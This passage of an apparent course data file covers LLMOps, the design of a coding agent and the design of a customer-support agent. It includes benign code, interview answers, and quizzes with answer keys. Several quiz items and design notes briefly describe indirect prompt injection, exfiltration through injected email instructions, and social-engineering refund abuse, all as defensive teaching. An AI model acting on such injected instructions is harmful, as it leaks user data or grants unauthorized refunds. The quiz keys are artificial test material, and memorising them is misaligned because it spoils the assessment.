        freq: "occasional",
      },
    ],
    quiz: [
      {
        q: "Instructions hidden in a web page the agent summarizes are…",
        options: ["Direct injection", "Indirect prompt injection", "A jailbreak by the user", "Data poisoning of training"],
        answer: 1,
        explain: "The attacker controls content the agent reads, not the user's prompt.",
      },
      {
        q: "Which change reliably prevents data exfiltration via an injected email instruction?",
        options: ["A sterner system prompt", "Removing or allow-listing the outbound send tool", "Lower temperature", "A larger model"],
        answer: 1,
        explain: "Cut the exfiltration leg with a structural control.",
      },
      {
        q: "Model-generated SQL should be…",
        options: ["Executed directly", "Treated as untrusted: validated, parameterized, least-privilege DB user", "Trusted if it parses", "Logged only"],
        answer: 1,
        explain: "Improper output handling is an OWASP LLM risk.",
      },
      {
        q: "In the dual-LLM / CaMeL approach, the privileged planner…",
        options: ["Reads all untrusted content", "Never sees raw untrusted content", "Has no tools", "Is a classifier"],
        answer: 1,
        explain: "A quarantined model handles untrusted text and returns constrained values.",
      },
      {
        q: "'Denial of wallet' attacks exploit…",
        options: ["Weak passwords", "Unbounded token consumption / runaway loops", "DNS", "Cache misses"],
        answer: 1,
        explain: "Set budgets, rate limits and loop caps.",
      },
    ],
  },

  // ------------------------------------------------------------------ LLMOPS
  {
    id: "llmops",
    title: "LLMOps: Cost, Latency, Routing & Fine-Tuning",
    tagline: "Run LLM features in production: tokens and dollars, speed, reliability, observability and adaptation.",
    difficulty: "intermediate",
    minutes: 17,
    visualizers: ["cascade", "lora"],
    concept: `
## Cost: know your token math
Cost per request = input tokens × input price + output tokens × output price (output is typically several times pricier, and thinking tokens count as output). Levers, roughly in order of impact:
1. **Pick the smallest model that passes your evals**, and **route or cascade** (see the lab).
2. **Prompt caching** for repeated prefixes (system prompts, documents, agent history).
3. **Batch APIs** for offline work: around half price in exchange for results within hours.
4. **Trim context**: retrieve less but better, truncate tool output, compact history.
5. **Cap output** (max_tokens, concise formats) and tune reasoning budgets per request type.
6. **Cache responses** for identical requests (and carefully, semantically similar ones).
Track **cost per feature, per user and per successful task**, not just total spend.

## Latency
- **TTFT** (time to first token) is dominated by queueing + prefill (input length). **Output speed** (tokens/s) depends on model size and load.
- **Stream** responses so users see progress, and run independent calls and tools **in parallel**.
- Shorter prompts and caching reduce TTFT. Smaller or faster models and less thinking reduce generation time. Choose nearby regions and keep connections warm.
- For agents, wall-clock time is mostly the number of sequential turns: fewer, more capable tools and parallel tool calls help most.

## Reliability
- Provider APIs return rate limits (429) and overload errors. Use **retries with exponential backoff + jitter**, respecting retry-after headers.
- **Fallbacks**: secondary model or provider, degraded mode (cached answer, simpler flow), and timeouts on every call.
- **Rate-limit budgeting**: requests per minute and tokens per minute per key. Queue and prioritize interactive over batch.
- **LLM gateways** (self-hosted or managed) centralize keys, routing, fallbacks, caching, budgets, logging and PII redaction across teams.
- **Idempotency** for side-effecting tools, so retries don't double-execute.

## Observability
Trace every request end to end: prompt version, model, inputs and outputs (with PII handling), token counts, cache hits, latency per step, tool calls, errors, cost. OpenTelemetry's GenAI conventions and LLM-specific tracing tools make agent runs inspectable. Sample transcripts for human review, and connect traces to eval scores and user feedback.

## Prompt and model lifecycle
Version prompts like code (review, changelog), gate changes with **eval suites in CI**, roll out gradually (shadow → canary → full) with online metrics, and pin model versions. Re-run evals before upgrading, because new models can regress on your specific tasks.

## Prompting vs RAG vs fine-tuning
| Need | Reach for |
|---|---|
| Better instructions, format, examples | Prompting (always first) |
| Private, fresh or large knowledge | RAG / tools |
| Consistent style, format or behavior at scale, a narrow task with lots of examples | Fine-tuning |
| Same quality from a smaller, cheaper, faster model | Distillation (fine-tune a small model on a big model's outputs) |
| Optimize for a gradable objective | RL fine-tuning with graders |
Fine-tuning teaches **behavior**, not reliable new facts (use retrieval for facts).

## Fine-tuning methods (see the LoRA calculator)
- **Full fine-tuning**: updates all weights. Highest capacity, but huge memory (~16 bytes/param with Adam) and a full model copy per variant.
- **LoRA**: freeze the base and learn low-rank adapters (W + BA) on chosen layers. Trainable params are often under 1%, adapters are megabytes, and many can share one base at serving time (multi-LoRA).
- **QLoRA**: LoRA on a 4-bit quantized base, so large models can be fine-tuned on one GPU.
- **Preference tuning** (DPO) and **RL fine-tuning** with graders for behavior and reasoning.
- Watch for **catastrophic forgetting** and overfitting. Data quality and diversity matter more than size, and you should always compare with the base model on your evals.
`,
    keyPoints: [
      "Cost = in × price_in + out × price_out. Output and thinking tokens are pricier.",
      "Levers: smallest passing model, routing and cascades, caching, batch API, trimming context.",
      "Latency: TTFT from prefill + queueing. Stream, parallelize, cut turns.",
      "Reliability: backoff + jitter, fallbacks, timeouts, gateways, idempotent tools.",
      "Trace everything, version prompts, gate changes with evals, pin model versions.",
      "Prompt → RAG → fine-tune. LoRA/QLoRA adapt behavior cheaply, and fine-tuning ≠ adding facts.",
    ],
    code: [
      {
        title: "Resilient model calls: retries, fallback and cost tracking",
        variants: [
          {
            lang: "python",
            code: `
import random, time

PRICES = {"small": (1, 5), "large": (15, 75)}     # $ per 1M input / output tokens (illustrative)
RETRYABLE = {429, 500, 502, 503, 529}

def call_with_retries(model, request, max_attempts=5, base=1.0, cap=30.0):
    for attempt in range(max_attempts):
        try:
            return client.create(model=model, timeout=60, **request)
        except APIError as e:
            if e.status not in RETRYABLE or attempt == max_attempts - 1:
                raise
            wait = e.retry_after or random.uniform(0, min(cap, base * 2 ** attempt))   # full jitter
            time.sleep(wait)

def generate(request, feature: str, user_id: str):
    for model in ("large", "small"):              # fallback chain: degrade, don't fail
        try:
            resp = call_with_retries(model, request)
            p_in, p_out = PRICES[model]
            cost = (resp.usage.input_tokens * p_in + resp.usage.output_tokens * p_out) / 1e6
            metrics.record(feature=feature, user=user_id, model=model, cost=cost,
                           ttft=resp.ttft, cache_read=resp.usage.cache_read_input_tokens)
            return resp
        except APIError:
            log.warning("model %s failed, falling back", model)
    return CACHED_FALLBACK_RESPONSE
`,
          },
        ],
      },
    ],
    interview: [
      {
        q: "Your LLM feature costs too much. How do you cut cost without hurting quality?",
        a: "Measure first: cost per request and per successful task, broken down by input, output, cache hits and feature. Then: (1) evaluate smaller models on your eval suite and **route or cascade** so only hard requests hit the big model; (2) enable **prompt caching** with a stable prefix; (3) **trim context**: better retrieval (fewer, more relevant chunks), truncated tool outputs, compaction; (4) cap output length and tune reasoning budgets; (5) use the **batch API** for anything not interactive; (6) cache identical responses; (7) for high-volume narrow tasks, **distill or fine-tune** a small model. Re-run evals after each change to confirm quality holds.",
        freq: "very-common",
      },
      {
        q: "When would you fine-tune instead of using RAG or prompting?",
        a: "Prompting first, always: it's fast to iterate and often enough. Use **RAG/tools** when the model needs knowledge it doesn't have (private, large or changing data), and fine-tuning is a poor way to add facts. Fine-tune when you need consistent **behavior** that prompting can't reliably achieve at scale (strict style or format, a specialized classification or extraction task with plenty of labeled examples, domain-specific tone), when you want to **shrink cost and latency** by distilling a big model's behavior into a small one, or when you can define a grader and use RL fine-tuning. Compare against the prompted baseline on evals, and watch for regressions on general capabilities.",
        freq: "very-common",
      },
      {
        q: "Explain LoRA and QLoRA.",
        a: "**LoRA** freezes the pretrained weights and adds a trainable low-rank update to selected weight matrices: W' = W + (α/r)·B·A, where B is d×r and A is r×d with a small rank r (e.g. 8–64). Only A and B train, typically well under 1% of parameters, so optimizer memory collapses, adapters are small files, and one base model can serve many adapters. **QLoRA** additionally stores the frozen base in 4-bit precision (NF4) and computes in bf16, cutting weight memory about 4× more, so a model that would need several GPUs to fine-tune fits on one. Quality is usually close to full fine-tuning for adaptation tasks.",
        freq: "common",
      },
      {
        q: "How do you make an LLM-backed service resilient to provider outages and rate limits?",
        a: "Timeouts on every call; **retries with exponential backoff and jitter** honoring retry-after, only for retryable errors; client-side rate limiting and queueing that prioritizes interactive traffic; **fallbacks** to another model or provider (keeping prompts portable and evaluated on both), then to degraded modes (cached or simpler answers); circuit breakers so a failing provider isn't hammered; idempotency keys on side-effecting tools; an LLM gateway to centralize this; and monitoring of error rates, latency and cost with alerts.",
        freq: "common",
      },
    ],
    quiz: [
      {
        q: "Which usually costs more per token?",
        options: ["Input tokens", "Output tokens", "Cache reads", "They're equal"],
        answer: 1,
        explain: "Output (including thinking) is typically several times pricier.",
      },
      {
        q: "Best fit for a nightly job summarizing 50,000 documents?",
        options: ["Streaming API", "Batch API", "Realtime voice API", "A larger model"],
        answer: 1,
        explain: "Batch APIs trade latency for a big discount.",
      },
      {
        q: "Fine-tuning is the right tool for…",
        options: ["Adding this week's product prices", "Consistent output style/format on a narrow high-volume task", "Answering from private docs", "Fixing a bad retrieval index"],
        answer: 1,
        explain: "Facts belong in retrieval. Fine-tuning shapes behavior.",
      },
      {
        q: "LoRA trains…",
        options: ["All weights", "Small low-rank adapter matrices", "Only the embeddings", "The tokenizer"],
        answer: 1,
        explain: "The base stays frozen. QLoRA also quantizes it to 4-bit.",
      },
      {
        q: "Retries on 429 errors should use…",
        options: ["Immediate tight loops", "Exponential backoff with jitter, honoring retry-after", "A fixed 1 ms delay", "No retries ever"],
        answer: 1,
        explain: "Same retry-storm lesson as in distributed systems.",
      },
    ],
  },

  // ------------------------------------------------------------------ CASE: CODING AGENT
  {
    id: "case-coding-agent",
    title: "Case Study: Design a Coding Agent",
    tagline: "Design a Claude Code / Codex-style agent: harness, tools, sandbox, context, subagents and evals.",
    difficulty: "advanced",
    minutes: 20,
    caseStudy: true,
    diagram: {
      title: "A coding agent harness",
      nodes: [
        { id: "dev", label: "Developer", sub: "terminal · IDE · web", kind: "client", x: 80, y: 280 },
        { id: "harness", label: "Agent harness", sub: "loop · context · UI", kind: "service", x: 290, y: 280 },
        { id: "memory", label: "Memory & skills", sub: "CLAUDE.md · AGENTS.md", kind: "storage", x: 290, y: 470 },
        { id: "api", label: "Model API", sub: "prompt caching", kind: "model", x: 290, y: 80 },
        { id: "sub", label: "Subagents", sub: "explore · review · test", kind: "model", x: 520, y: 80 },
        { id: "perms", label: "Permissions + hooks", sub: "allow · ask · deny", kind: "control", x: 520, y: 280 },
        { id: "traces", label: "Traces & cost", kind: "monitor", x: 520, y: 470 },
        { id: "sandbox", label: "Sandbox", sub: "fs + network policy", kind: "worker", x: 740, y: 280 },
        { id: "repo", label: "Repo + git checkpoints", kind: "storage", x: 920, y: 280 },
        { id: "mcp", label: "MCP servers", sub: "GitHub · DB · browser", kind: "external", x: 740, y: 470 },
      ],
      edges: [
        { from: "dev", to: "harness" },
        { from: "harness", to: "memory" },
        { from: "harness", to: "api" },
        { from: "harness", to: "sub" },
        { from: "sub", to: "api" },
        { from: "harness", to: "perms" },
        { from: "harness", to: "traces", dashed: true },
        { from: "perms", to: "sandbox" },
        { from: "sandbox", to: "repo" },
        { from: "perms", to: "mcp" },
      ],
      flows: [
        {
          name: "Fix a bug end to end",
          path: ["dev", "harness", "memory", "harness", "api", "harness", "perms", "sandbox", "repo", "sandbox", "perms", "harness", "api", "harness", "dev"],
          steps: [
            "“The CSV export drops non-ASCII characters. Fix it.”",
            "Load memory files (build and test commands, conventions) and the names and descriptions of available skills.",
            "Context assembled: system prompt, tool schemas (built-in + MCP), memory, the request.",
            "Call the model. The stable prefix is a cache read after the first turn, which cuts cost and time-to-first-token.",
            "A streamed response with tool calls: grep for the exporter, read the file, run the failing case.",
            "Every call is schema-validated, then checked against allow/ask/deny rules and PreToolUse hooks.",
            "Allowed calls execute in the sandbox: repo-only writes, network limited to allow-listed hosts.",
            "Edits apply after a checkpoint snapshot, so any step can be rewound.",
            "Tests run: the encoding test now passes, and the full suite is green.",
            "Results pass back through PostToolUse hooks (formatter, linter) and the output cap.",
            "Truncated outputs come back as tool results. The context is compacted if it's getting full.",
            "The loop continues until the model stops calling tools.",
            "A final summary with the diff.",
            "The developer reviews and commits, or the agent opens a PR via the GitHub MCP server.",
          ],
        },
        {
          name: "Delegate to a subagent",
          path: ["harness", "sub", "api", "sub", "harness"],
          steps: [
            "The main agent spawns an 'explore' subagent: find every place that writes CSV.",
            "The subagent runs its own loop with read-only tools and a fresh context.",
            "It reads 40 files (~60k tokens) in its own window.",
            "It returns a 300-token list of call sites. The main context stays small.",
          ],
        },
        {
          name: "Using an MCP integration",
          path: ["harness", "perms", "mcp", "perms", "harness"],
          steps: [
            "The agent wants sample rows from the staging database via a Postgres MCP server.",
            "Policy: read-only SELECTs on staging are allowed, and anything else asks the user. Production credentials aren't available to the agent at all.",
            "Rows are returned, treated as untrusted data (they could contain injected text).",
            "The results are truncated to the most relevant columns before entering context.",
          ],
        },
      ],
    },
    concept: `
## 1. Requirements
**Functional**: understand a codebase, edit files, run commands and tests, use git, integrate external systems (issues, CI, databases) and work interactively or headless (CI, scheduled jobs, PR bots).
**Non-functional**: safe by default (no destructive or exfiltrating actions without consent), responsive (streaming, low time-to-first-token), cost-efficient on long sessions, reliable over 100+ tool-call sessions, observable, and extensible (MCP, skills, hooks), plus enterprise controls (policy, SSO, audit).

## 2. High-level design (see the diagram)
- **Clients**: CLI, IDE extensions, web, CI runners. They all drive the same harness core (also exposed as an SDK).
- **Harness core**: the agent loop, context assembly, tool registry, permission engine, hooks, compaction, sub-agents, checkpoints, streaming UI events.
- **Model API**: a frontier model with tool use, interleaved thinking and prompt caching. Smaller models for cheap sub-tasks (summaries, titles, quick searches).
- **Execution**: local sandbox (OS-level isolation) or remote containers and VMs for cloud and background agents.
- **Integrations**: MCP servers, the git host, CI, issue trackers.
- **Telemetry**: traces, token and cost accounting, error reporting, with opt-in transcript sharing for evals.

## 3. Key decisions
- **Tools**: read (paged), search (grep/glob: agentic search instead of an embedding index), edit (**exact string replacement**: precise, cheap, verifiable, and the edit fails loudly if the target isn't unique), write, shell (with timeouts and output caps), web fetch and search, task/sub-agent, to-do list.
- **Context**: memory files for conventions, just-in-time file reading, truncated tool output, **auto-compaction** near the limit, to-do lists and notes files for long tasks, sub-agents for exploration. Keep a cache-friendly prefix.
- **Safety**: permission modes (ask / accept edits / plan / sandboxed autonomy), allow/deny rules, hooks for invariants, checkpoints for undo, network egress allow-lists, secrets kept out of the sandbox, and prompt-injection awareness (repo files, web pages and tool output are untrusted).
- **Parallelism**: parallel tool calls, sub-agents, and multiple agents on separate git worktrees or containers for independent tasks.
- **Headless mode**: the same loop without a UI for CI (fix lint, triage issues, review PRs), with tighter permissions and budgets.

## 4. Scaling and cost
Each turn re-sends the conversation, so **prompt caching** is mandatory. Limit output tokens, route trivial sub-tasks to small models, cap turns per task, and show users cost and context usage. Cloud agents need a **job scheduler**, container pools with pre-warmed images, repo caching, and per-tenant quotas.

## 5. Evaluation
An internal benchmark of real tasks (bug fixes, features, refactors) in containers with hidden tests, in the style of SWE-bench, plus terminal tasks. Track success rate, pass^k, turns, tokens, cost and wall-clock time. Add trajectory checks for unsafe actions, regression suites for harness changes (tool descriptions, prompts, compaction), and online metrics: acceptance of edits, session success, interruptions and user corrections.

## 6. Failure modes to discuss
Loops on a failing approach (detect repetition, force replanning), over-eager changes outside scope (instructions + review + checkpoints), hallucinated APIs or packages (run the code, verify package existence), context exhaustion on huge repos (sub-agents, compaction), flaky tests misread as failures (re-run), and destructive commands (deny rules + sandbox).
`,
    keyPoints: [
      "Harness core shared by CLI, IDE, web and headless/CI clients, and exposed as an SDK.",
      "Tools: paged read, grep/glob search, exact-string edits, sandboxed shell, sub-agents, to-dos.",
      "Context: memory files, just-in-time reads, truncation, auto-compaction, cache-friendly prefix.",
      "Safety: permission modes, allow/deny rules, hooks, checkpoints, egress limits, injection awareness.",
      "Cost: prompt caching, turn caps, small models for sub-tasks.",
      "Evals: containerized real tasks with hidden tests, pass^k, cost and trajectory checks.",
    ],
    code: [
      {
        title: "Exact-string edit tool (why coding agents prefer it)",
        variants: [
          {
            lang: "python",
            code: `
def edit_file(path: str, old_string: str, new_string: str, replace_all: bool = False) -> str:
    """Replace an exact snippet. Fails loudly instead of guessing, so the model can correct itself."""
    if not is_inside_project(path):
        return f"Error: {path} is outside the project directory."
    text = read(path)
    count = text.count(old_string)
    if count == 0:
        return "Error: old_string not found. Re-read the file. Whitespace and indentation must match exactly."
    if count > 1 and not replace_all:
        return f"Error: old_string appears {count} times. Include more surrounding lines to make it unique."
    checkpoint(path)                                   # snapshot for undo / rewind
    write(path, text.replace(old_string, new_string) if replace_all else text.replace(old_string, new_string, 1))
    run_hooks("PostToolUse", tool="edit", path=path)   # e.g. formatter, linter
    return f"Edited {path}: {len(old_string.splitlines())} → {len(new_string.splitlines())} lines."
`,
          },
        ],
      },
    ],
    interview: [
      {
        q: "Design an AI coding agent like Claude Code or Codex CLI.",
        a: "Clarify scope (interactive CLI, IDE, headless CI, cloud background agents) and the safety bar. **Core**: an agent loop around a frontier tool-using model with prompt caching. **Tools**: paged file read, grep/glob search (agentic search, no stale index), exact-string edit + write, sandboxed shell with timeouts and output caps, web fetch, sub-agent launcher, to-do list, plus MCP for external systems. **Context**: system prompt + memory files (project conventions), just-in-time reads, truncation, auto-compaction, notes for long tasks, sub-agents for exploration. **Safety**: permission modes and allow/ask/deny rules, hooks for invariants, OS-level sandbox with egress allow-lists, checkpoints for undo, no production secrets, treating repo and web content as untrusted. **UX**: streaming, interrupts, plan mode, diff review. **Ops**: traces, cost accounting, turn and spend budgets. **Evals**: containerized real tasks with hidden tests, tracking success, pass^k, cost and unsafe actions, run on every harness or prompt change.",
        freq: "common",
      },
      {
        q: "Why do coding agents use exact string replacement for edits instead of rewriting whole files?",
        a: "Rewriting a whole file costs output tokens proportional to the file size (slow and expensive for large files) and risks silently dropping or altering unrelated code. Exact-string replacement only emits the changed snippet, is cheap and fast, and is **verifiable**: if the target text doesn't exist or isn't unique, the tool fails with an actionable error and the model re-reads and retries instead of guessing. It also produces clean, reviewable diffs. Unified-diff formats are an alternative but models make more formatting errors with them, so many harnesses prefer search/replace.",
        freq: "occasional",
      },
      {
        q: "How would you keep a coding agent effective over a 3-hour task?",
        a: "Long-horizon work fails from context exhaustion and drift. Use a **to-do list / plan file** the agent updates and re-reads; **auto-compaction** that preserves decisions, state and open items while dropping raw logs; **sub-agents** for exploration so the main context stays focused; **git commits as checkpoints** so progress is durable and reversible; **progress notes** written for 'future self' in case of restart; tests as continuous ground truth; and budgets plus periodic check-ins with the user. For very long tasks, split into sessions or parallel agents on separate worktrees, each with a clear scope.",
        freq: "common",
      },
    ],
    quiz: [
      {
        q: "Why is prompt caching essential for coding agents?",
        options: ["Models are slow", "Every turn re-sends the growing conversation", "Tools are expensive", "It improves accuracy"],
        answer: 1,
        explain: "The repeated prefix becomes cheap cache reads.",
      },
      {
        q: "An exact-string edit fails because the snippet appears 3 times. The right behavior is…",
        options: ["Replace the first one", "Return an error asking for more context to make it unique", "Replace all silently", "Rewrite the file"],
        answer: 1,
        explain: "Fail loudly and let the model disambiguate.",
      },
      {
        q: "Best place to guarantee the agent never pushes to main?",
        options: ["A sentence in the system prompt", "A deny rule / hook in the harness (and branch protection)", "A larger model", "Lower temperature"],
        answer: 1,
        explain: "Enforce invariants deterministically, ideally at two layers.",
      },
      {
        q: "Repo files and web pages the agent reads should be treated as…",
        options: ["Trusted instructions", "Untrusted data that may contain injected instructions", "System prompt", "Memory"],
        answer: 1,
        explain: "Indirect prompt injection can arrive from any content.",
      },
    ],
  },

  // ------------------------------------------------------------------ CASE: SUPPORT AGENT
  {
    id: "case-support-agent",
    title: "Case Study: AI Customer-Support Agent",
    tagline: "Resolve tickets end to end with retrieval, scoped tools, policy limits, human handoff and evals.",
    difficulty: "advanced",
    minutes: 18,
    caseStudy: true,
    diagram: {
      title: "Customer-support agent platform",
      nodes: [
        { id: "customer", label: "Customer", kind: "client", x: 80, y: 280 },
        { id: "gw", label: "Channel gateway", sub: "chat · email · voice", kind: "gateway", x: 260, y: 280 },
        { id: "guard", label: "Guardrails", sub: "PII · abuse · injection", kind: "worker", x: 450, y: 280 },
        { id: "agent", label: "Support agent", sub: "routed prompt + tools", kind: "model", x: 650, y: 280 },
        { id: "kb", label: "Knowledge base", sub: "hybrid search + rerank", kind: "search", x: 650, y: 80 },
        { id: "policy", label: "Policy engine", sub: "limits · approvals", kind: "control", x: 880, y: 400 },
        { id: "tools", label: "Order & refund APIs", sub: "scoped to this customer", kind: "service", x: 880, y: 160 },
        { id: "human", label: "Human agents", sub: "escalation queue", kind: "client", x: 450, y: 480 },
        { id: "evals", label: "Evals & QA", sub: "transcripts · CSAT", kind: "monitor", x: 650, y: 480 },
      ],
      edges: [
        { from: "customer", to: "gw" },
        { from: "gw", to: "guard" },
        { from: "guard", to: "agent" },
        { from: "agent", to: "kb" },
        { from: "agent", to: "policy" },
        { from: "policy", to: "tools" },
        { from: "agent", to: "human", label: "handoff" },
        { from: "human", to: "gw" },
        { from: "agent", to: "evals", dashed: true },
      ],
      flows: [
        {
          name: "Answer from the docs",
          path: ["customer", "gw", "guard", "agent", "kb", "agent", "guard", "gw", "customer"],
          steps: [
            "“How do I change the email on my account?”",
            "The gateway authenticates the customer and attaches their account ID and channel. The agent will act only on behalf of this identity.",
            "Input checks: abuse, PII redaction for logs, injection heuristics. The intent router picks the account-settings prompt.",
            "The agent searches the knowledge base (hybrid + rerank), filtered to the customer's plan and region.",
            "The top passages come back with source IDs.",
            "It drafts a grounded answer with a help-center link. If the docs don't cover it, it says so.",
            "Output checks: no internal data, matches policy and tone.",
            "Delivered in under 3 seconds, streamed.",
          ],
        },
        {
          name: "Refund within policy",
          path: ["customer", "gw", "guard", "agent", "policy", "tools", "policy", "agent", "guard", "gw", "customer"],
          steps: [
            "“My headphones arrived broken. Order ORD-482913.”",
            "Authenticated session.",
            "Routed to the refunds flow.",
            "The agent calls get_order, then issue_refund(ORD-482913, $49).",
            "The policy engine (code, not the model) checks: the order belongs to this customer, it's within 30 days, the amount ≤ $100 auto-limit, no refund already issued. Approved.",
            "The refund API executes with an idempotency key (a retry won't double-refund).",
            "Confirmation returns.",
            "The agent explains what happens next (5–7 business days).",
            "Output check passes.",
            "Sent. Resolved without a human, and the interaction is logged for QA.",
          ],
        },
        {
          name: "Over the limit → human",
          path: ["agent", "policy", "agent", "human", "gw", "customer"],
          steps: [
            "A $640 refund request.",
            "Policy: above the auto-approve limit, so a human is required.",
            "The agent hands off with a structured summary: customer, order, issue, evidence, suggested action. The customer never has to repeat themselves.",
            "A human agent reviews and approves in one click.",
            "The reply goes out through the same channel, and the outcome becomes a labeled example for evals.",
          ],
        },
      ],
    },
    concept: `
## 1. Requirements
**Functional**: answer product questions from the knowledge base, look up orders and accounts, perform actions (refunds, address changes, cancellations) within policy, hand off to humans with context, and support chat and email (and maybe voice) in multiple languages.
**Non-functional**: correctness and policy compliance over cleverness; **consistency** across thousands of conversations (pass^k, not pass@k); low latency for chat (stream, < ~3 s to first token); privacy (PII handling, retention); auditability; graceful degradation when the model or a backend is down.
**Success metrics**: automated resolution rate, CSAT, escalation rate and escalation quality, policy violations (target: zero), cost per resolved ticket, time to resolution.

## 2. Architecture (see the diagram)
- **Channel gateway**: authenticates the customer, so the agent acts **on behalf of that identity only**, with tokens scoped to their data. It also normalizes channels.
- **Guardrails**: input moderation, PII redaction for logs, injection detection on customer text and on retrieved content. Output checks for leakage and tone.
- **Router**: intent classification to specialized prompts and toolsets (refunds, shipping, account, technical, FAQ), with cheap models for simple intents.
- **Agent**: a tool-using model with hybrid retrieval over the help center, order, shipping and account tools, and a handoff tool.
- **Policy engine (in code)**: refund limits, eligibility windows, ownership checks, rate limits, and actions requiring human approval. The model *proposes* and code *disposes*.
- **Human handoff**: a structured summary into the agent-desk queue. Humans can also approve drafted actions.
- **Data and evals**: every conversation, tool call and outcome is logged, then sampled for QA, labeled, and turned into regression cases.

## 3. Key design choices
- **Never let the model be the authorization layer.** Tool APIs check that the order belongs to the authenticated customer, whatever the model asks.
- **Idempotent actions** with request keys, and confirmation steps for destructive changes.
- **Grounding**: answer only from retrieved policy and docs, cite them, and say "I'm not sure, let me get a teammate" instead of improvising policy.
- **Conversation state**: persist across channels and sessions, with summaries for long threads.
- **Multilingual**: answer in the customer's language and keep the knowledge base in one language, with retrieval through translation or multilingual embeddings.

## 4. Rollout strategy
1. **Offline evals**: a replay of historical tickets plus simulated customers (an LLM playing personas, including adversarial ones) in a sandbox with fake backends. Measure resolution, policy violations and pass^k.
2. **Shadow mode**: the agent drafts, humans send. Compare with what humans did.
3. **Assist mode**: humans approve the agent's drafts with one click.
4. **Autonomous on low-risk intents** (order status, FAQs), then expand intent by intent as metrics hold.
5. Continuous: QA sampling, CSAT, escalation reviews, new regression cases from every failure.

## 5. Deep dives
- **Cost**: routing, caching of the system prompt and policies, short outputs. Compare cost per resolved ticket with a human-handled ticket.
- **Latency**: stream, run retrieval and the order lookup in parallel, use small models for classification.
- **Abuse**: social engineering ("I'm the CEO, refund everything"), prompt injection in email bodies or attachments, refund fraud patterns. Policy in code plus rate limits plus anomaly detection.
- **Outages**: if the model is down, fall back to a classic menu or the human queue. If the refunds API is down, take the request and promise follow-up.
`,
    keyPoints: [
      "Authenticate at the gateway, and have tools act only on behalf of that customer.",
      "The model proposes, a code policy engine disposes: limits, ownership, approvals.",
      "Hybrid retrieval with grounding and citations, and 'I don't know' over improvised policy.",
      "Structured human handoff, so customers never repeat themselves.",
      "Measure consistency (pass^k), policy violations, resolution rate, CSAT, cost per ticket.",
      "Roll out: offline evals → shadow → assist → autonomous by intent.",
    ],
    code: [
      {
        title: "Policy check for a refund tool",
        variants: [
          {
            lang: "python",
            code: `
from datetime import datetime, timedelta

AUTO_REFUND_LIMIT = 100.00
REFUND_WINDOW = timedelta(days=30)

def issue_refund(session, order_id: str, amount: float, reason: str) -> dict:
    """Tool exposed to the agent. Authorization and policy live HERE, not in the prompt."""
    order = orders.get(order_id)
    if order is None or order.customer_id != session.customer_id:          # ownership, from the auth token
        return {"error": "Order not found for this customer. Ask them to confirm the order ID."}
    if order.refunded_amount + amount > order.total:
        return {"error": f"Refund exceeds remaining refundable amount ({order.total - order.refunded_amount:.2f})."}
    if datetime.utcnow() - order.delivered_at > REFUND_WINDOW:
        return {"needs_human": True, "why": "Outside the 30-day window. Hand off with a summary."}
    if amount > AUTO_REFUND_LIMIT:
        ticket = approvals.request(session, order_id, amount, reason)       # human in the loop
        return {"pending_approval": ticket.id, "tell_customer": "A teammate will confirm within 1 business day."}
    refund = payments.refund(order_id, amount, idempotency_key=f"{session.id}:{order_id}:{amount}")
    audit.log(session, "refund", order_id=order_id, amount=amount, reason=reason)
    return {"refund_id": refund.id, "eta_days": "5-7"}
`,
          },
        ],
      },
    ],
    interview: [
      {
        q: "Design an AI agent that resolves customer support tickets.",
        a: "Start from metrics and risk: automated resolution rate, CSAT, zero policy violations, cost per ticket. **Architecture**: a channel gateway that authenticates the customer (all tools act on their behalf only) → guardrails (moderation, PII, injection) → an intent router → a tool-using agent with hybrid retrieval over the help center plus scoped order and account tools → a **policy engine in code** (ownership checks, refund limits and windows, approval requirements, idempotency) → structured **human handoff**. Log everything for QA. **Quality**: grounded answers with citations, 'I don't know' over improvisation, simulated-customer evals measuring pass^k and policy compliance. **Rollout**: offline replay → shadow → human-approved drafts → autonomy per low-risk intent. Cover cost (routing, caching), latency (streaming, parallel lookups), outages (fallback to the human queue) and abuse (social engineering, injection via email).",
        freq: "common",
      },
      {
        q: "How do you stop the support agent from giving refunds it shouldn't?",
        a: "Don't rely on the prompt. The refund **tool** enforces policy in code: verify the order belongs to the authenticated customer (from the session token, not from model-supplied IDs alone), check eligibility windows and remaining refundable amounts, cap auto-approved amounts, route larger ones to human approval, use idempotency keys so retries can't double-refund, and rate-limit per customer. The model can only *request* actions, and the backend decides. Add monitoring for anomalous refund patterns, and evals with adversarial personas (social engineering, injected instructions in emails) to verify it holds.",
        freq: "common",
      },
      {
        q: "Why measure pass^k for a support agent?",
        a: "Each customer gets one conversation, and the business experiences the agent's behavior across all of them. An agent that resolves a scenario correctly 80% of the time will mishandle it for 1 in 5 customers. pass^k (the probability it succeeds on all k independent trials of the same scenario) exposes that inconsistency, which pass@1 averages away and pass@k hides entirely. Optimizing for pass^k pushes toward deterministic policy in code, clearer tools and tighter prompts.",
        freq: "occasional",
      },
    ],
    quiz: [
      {
        q: "Who should verify that an order belongs to the customer?",
        options: ["The model, by reading the conversation", "The tool/backend using the authenticated session", "The customer", "The router"],
        answer: 1,
        explain: "Authorization lives in code, never in the model.",
      },
      {
        q: "Safest first production step for a new support agent?",
        options: ["Full autonomy on all intents", "Shadow mode: the agent drafts, humans send", "Disable evals", "Let it learn from live customers"],
        answer: 1,
        explain: "Then assist mode, then autonomy intent by intent.",
      },
      {
        q: "Why use idempotency keys on the refund API?",
        options: ["Faster refunds", "So retries don't refund twice", "To encrypt data", "For caching"],
        answer: 1,
        explain: "Agents and networks retry. Side effects must be safe to repeat.",
      },
      {
        q: "A good human handoff includes…",
        options: ["Nothing: humans read the whole chat", "A structured summary: customer, issue, evidence, suggested action", "Only the last message", "The system prompt"],
        answer: 1,
        explain: "The customer shouldn't have to repeat themselves.",
      },
    ],
  },
];
